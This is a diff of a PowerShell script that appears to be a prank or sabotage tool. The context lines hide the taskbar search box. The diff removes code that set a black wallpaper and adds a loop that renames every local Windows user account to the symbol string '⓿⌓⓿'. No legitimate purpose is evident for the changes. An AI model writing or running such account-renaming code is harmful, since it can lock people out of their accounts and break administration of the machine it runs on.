@@ -42,26 +42,13 @@ $searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
 New-Item -Path $searchBarPath -Force | Out-Null
 Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0
 
-# Change wallpaper to black
-$wallpaperPath = "$env:UserProfile\wallpaper.bmp"
-$blackColor = 0x00000000
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
+# Change user account names
+$accounts = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True'"
 
-public static class Wallpaper {
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+foreach ($account in $accounts) {
+    $newName = "⓿⌓⓿"
+    $account.Rename($newName)
 }
-
-public static class BlackWallpaper {
-    public static void Set() {
-        Wallpaper.SystemParametersInfo(0x0014, 0, "$wallpaperPath", 0x0001 | 0x0002);
-    }
-}
-"@
-
-[BlackWallpaper]::Set()
 
 $source = @"
 using System;
